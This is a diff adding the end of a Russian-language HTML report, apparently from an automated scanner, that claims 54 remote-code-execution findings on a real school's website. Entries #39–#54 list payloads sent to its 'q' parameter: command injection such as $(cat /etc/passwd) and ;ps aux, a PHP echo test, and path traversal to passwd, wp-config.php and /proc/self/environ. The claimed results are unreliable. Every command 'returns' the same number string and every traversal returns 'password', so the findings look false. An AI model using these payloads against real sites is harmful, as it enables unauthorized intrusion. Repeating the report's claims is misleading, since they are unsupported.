+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #39</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">$(cat /etc/passwd)</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #40</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">;uname -a</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #41</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">|uname -a</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #42</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">`uname -a`</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #43</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">$(uname -a)</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #44</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">;ps aux</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #45</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">|ps aux</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #46</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">`ps aux`</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #47</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">$(ps aux)</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> os_command</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Внедрение системных команд ОС</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">1855 12 8.70963 10.5502 8.66759</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #48</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload"><?php echo "RCE_TEST"; ?></pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> php_code</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выполнение PHP кода</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">RCE_TEST</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #49</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">../../../etc/passwd</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> path_traversal</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выход за пределы корневой директории (path traversal)</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">password</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #50</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">../../../etc/hosts</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> path_traversal</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выход за пределы корневой директории (path traversal)</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">password</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #51</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">../../../var/www/html/index.php</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> path_traversal</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выход за пределы корневой директории (path traversal)</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">password</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #52</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">../../../var/www/html/config.php</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> path_traversal</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выход за пределы корневой директории (path traversal)</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">password</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #53</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">../../../var/www/html/wp-config.php</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> path_traversal</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выход за пределы корневой директории (path traversal)</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">password</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #54</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">../../../proc/self/environ</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> path_traversal</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выход за пределы корневой директории (path traversal)</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">password</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+    <div class="stats">
+        <h2>📊 СТАТИСТИКА УЯЗВИМОСТЕЙ</h2>
+        <p><strong>Всего уязвимостей:</strong> 60</p>
+    <p><strong>XSS-уязвимости:</strong> 6</p>
+<p><strong>RCE-уязвимости:</strong> 54</p>
+
+    </div>
+    
+            <div class="footer">
+                <p>Отчет сгенерирован: 2025-05-26 17:38:19</p>
+            </div>
+        </div>
+    </body>
+    </html>
+    
